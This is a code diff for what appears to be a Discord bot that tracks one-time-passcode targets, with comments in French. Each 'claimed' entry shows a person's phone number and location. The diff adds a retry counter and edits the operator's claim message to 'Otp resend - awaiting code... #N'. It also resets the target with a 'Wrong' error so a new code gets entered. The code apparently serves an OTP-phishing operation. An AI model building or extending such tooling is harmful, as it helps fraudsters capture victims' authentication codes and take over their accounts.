@@ -243,7 +243,10 @@ function claimedBody(u, cfg, asked = false) {
     `**Phone**\u2003\`${u.phone ?? "?"}\`\n` +
     `**Location**\u2003${geo.city ?? "?"}, ${geo.country ?? "?"}`;
 
-  if (asked === "received") {
+  if (typeof asked === "string" && asked.startsWith("retry:")) {
+    const n = asked.slice("retry:".length);
+    body += `\n\nOtp resend - awaiting code... #${n}`;
+  } else if (asked === "received") {
     body += `\n\notp receive`;
   } else if (asked) {
     body += `\n\n${CALL_EMOJI} otp requested \u2014 waiting for the user to type the username.`;
@@ -659,6 +662,9 @@ export async function handleRetryButton(interaction, userId) {
   const u = await loadotpUser(interaction, userId);
   if (!u) return;
 
+  // compteur de tentatives : le 1er retry passe le claim message \u00e0 #2, le 2e \u00e0 #3, etc.
+  const nextCount = (u.retry_count || 1) + 1;
+
   await db.collection("users").updateOne(
     { id: userId },
     {
@@ -666,6 +672,7 @@ export async function handleRetryButton(interaction, userId) {
         state: "code",
         code_submitted: null,
         error_message: "Wrong",
+        retry_count: nextCount,
         updated_at: nowIso(),
       },
     }
@@ -695,6 +702,18 @@ export async function handleRetryButton(interaction, userId) {
     );
   } catch (e) {
     log.warn(`retry editReply failed: ${e}`);
+  }
+
+  // \u00e9dite le message de claim : "Otp resend - awaiting code... #N", bouton inchang\u00e9
+  if (u.claim_channel_id && u.claim_message_id) {
+    try {
+      const ch = await getChannel(u.claim_channel_id);
+      const claimMsg = await ch.messages.fetch(u.claim_message_id);
+      const cfg = await getConfig();
+      await claimMsg.edit(ClaimedView(u, cfg, `retry:${nextCount}`));
+    } catch (e) {
+      log.warn(`failed to update claim message on retry: ${e}`);
+    }
   }
 }
 
